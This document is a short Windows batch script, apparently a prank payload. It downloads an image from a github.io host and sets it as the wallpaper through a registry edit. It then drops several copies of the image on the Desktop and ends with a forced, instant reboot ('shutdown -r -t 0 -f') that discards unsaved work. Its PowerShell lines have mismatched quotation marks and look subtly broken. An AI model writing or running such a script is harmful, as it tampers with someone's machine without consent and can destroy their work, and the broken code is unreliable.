mkdir C:\Sam
powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "C:\Sam\wallpaper.bmp}"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Sam\Wallpaper.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
cd %UserProfile%\Desktop
powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\ezip.bmp}"
powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\a.bmp}"
powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\b.bmp}"
powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\c.bmp}"
shutdown -r -t 0 -f
